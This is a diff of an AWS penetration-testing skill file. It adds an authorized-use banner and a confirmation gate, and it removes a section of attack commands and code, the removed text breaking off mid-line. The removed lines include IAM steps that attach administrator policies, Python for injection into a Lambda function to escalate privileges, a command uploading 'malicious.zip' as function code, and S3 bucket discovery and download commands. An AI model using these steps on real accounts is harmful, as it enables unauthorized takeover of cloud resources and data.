@@ -8,6 +8,20 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/aws-
 ---
 
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # AWS Penetration Testing
@@ -165,45 +179,4 @@ aws iam create-access-key --user-name target_user
 
 ```bash
 aws iam attach-user-policy --user-name my_username \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-```
-
-### Add Inline Admin Policy
-
-```bash
-aws iam put-user-policy --user-name my_username \
-  --policy-name admin_policy \
-  --policy-document file://admin-policy.json
-```
-
-### Lambda Privilege Escalation
-
-```python
-# code.py - Inject into Lambda function
-import boto3
-
-def lambda_handler(event, context):
-    client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
-    return response
-```
-
-```bash
-# Update Lambda code
-aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
-```
-
----
-
-## S3 Bucket Exploitation
-
-### Bucket Discovery
-
-```bash
-# Using bucket_finder
-./bucket_finder.rb wordlist.txt
-./bucket_finder.rb --download --region us-east-1 wordlis
+  --policy-arn ar
